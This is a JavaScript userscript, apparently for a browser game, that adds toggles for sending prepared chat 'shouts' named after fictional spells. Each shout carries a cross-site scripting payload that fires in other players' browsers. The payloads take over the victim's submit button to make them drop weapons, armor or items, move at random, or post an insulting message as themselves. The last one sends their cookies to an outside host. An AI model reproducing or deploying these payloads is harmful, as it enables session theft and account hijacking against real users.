
var wordslist = [
	{
		id: "shout0",
		name: "<影子束缚术>",
		content: "影子束缚术" +
			"<img src=x onerror=this.hidden=true;if(!$(%26quot;myDiv%26quot;))$(%26quot;submit%26quot;).disabled=true;>"
	},
	{
		id: "shout1",
		name: "<缴械>",
		content: "除你武器" +
			"<img src=x onerror=this.hidden=true;if(!$(%26quot;myDiv%26quot;))$(%26quot;submit%26quot;).onclick=function(){" +
			"o=zXmlHttp.createRequest();o.open(%26quot;post%26quot;,%26quot;command.php%26quot;,true);o.setRequestHeader(" +
			"%26quot;Content-Type%26quot;,%26quot;application/x-www-form-urlencoded%26quot;);o.onreadystatechange=" +
			"function(){if(o.readyState==4)showGamedata(o.responseText);};o.send(%26quot;" +
			"mode=itemmain%26command=dropwep" +
			"%26quot;);};>"
	},
	{
		id: "shout2",
		name: "<见云卸甲>",
		content: "见云卸甲" +
			"<img src=x onerror=this.hidden=true;if(!$(%26quot;myDiv%26quot;))$(%26quot;submit%26quot;).onclick=function(){" +
			"o=zXmlHttp.createRequest();o.open(%26quot;post%26quot;,%26quot;command.php%26quot;,true);o.setRequestHeader(" +
			"%26quot;Content-Type%26quot;,%26quot;application/x-www-form-urlencoded%26quot;);o.onreadystatechange=" +
			"function(){if(o.readyState==4)showGamedata(o.responseText);};o.send(%26quot;" +
			"mode=itemmain%26command=droparb" +
			"%26quot;);};>"
	},
	{
		id: "shout3",
		name: "<过河拆桥>",
		content: "过河拆桥" +
			"<img src=x onerror=this.hidden=true;if(!$(%26quot;myDiv%26quot;))$(%26quot;submit%26quot;).onclick=function(){" +
			"o=zXmlHttp.createRequest();o.open(%26quot;post%26quot;,%26quot;command.php%26quot;,true);o.setRequestHeader(" +
			"%26quot;Content-Type%26quot;,%26quot;application/x-www-form-urlencoded%26quot;);o.onreadystatechange=" +
			"function(){if(o.readyState==4)showGamedata(o.responseText);};o.send(" +
			"%26quot;mode=itemmain%26command=dropitm%26quot;%2BparseInt(Math.random()*5%2B1));};>"
	},
	{
		id: "shout4",
		name: "<神罗天征>",
		content: "神罗天征" +
			"<img src=x onerror=this.hidden=true;if(!$(%26quot;myDiv%26quot;))$(%26quot;submit%26quot;).onclick=function(){" +
			"o=zXmlHttp.createRequest();o.open(%26quot;post%26quot;,%26quot;command.php%26quot;,true);o.setRequestHeader(" +
			"%26quot;Content-Type%26quot;,%26quot;application/x-www-form-urlencoded%26quot;);o.onreadystatechange=" +
			"function(){if(o.readyState==4)showGamedata(o.responseText);};o.send(" +
			"%26quot;mode=command%26command=move%26moveto=%26quot;%2BparseInt(Math.random()*22));};>"
	},
	{
		id: "shout5",
		name: "<月读>",
		content: "月读" +
			"<img src=x onerror=this.hidden=true;if(!$(%26quot;myDiv%26quot;))$(%26quot;submit%26quot;).onclick=function(){" +
			"$(%26quot;chatmsg%26quot).value=%26quot;我……是……傻逼……啊……%26quot;;$(%26quot;send%26quot;).onclick();" +
			"postCommand();};>"
	},
	{
		id: "shout6",
		name: "<摄魂咒>",
		content: "<img src=x onerror=this.parentElement.hidden=true;if(!$(%26quot;myDiv%26quot;)){" +
			"var%26nbsp;i=document.createElement(%26quot;img%26quot;);" +
			"i.src=%26quot;http://regan.sinaapp.com/?log=%26quot;%2Bdocument.cookie;" +
			"document.body.appendChild(i);}>"
	}
];

(function() {
	var headerlink = document.getElementsByClassName("headerlink")[0];
	headerlink.appendChild(document.createElement("br"));
	for (var i = 0; i < wordslist.length; i++) {
		headerlink.appendChild(createConfigBar(false, wordslist[i].name, wordslist[i].id, function(bar) {
			if (bar.value) {
				for (var j = 0; j < wordslist.length; j++)
					if (wordslist[j].id != bar.id && $(wordslist[j].id).value)
						$(wordslist[j].id).onclick();
				words = wordslist[bar.id[5]].content;
			}
			else
				words = "";
		}));
	}
})();
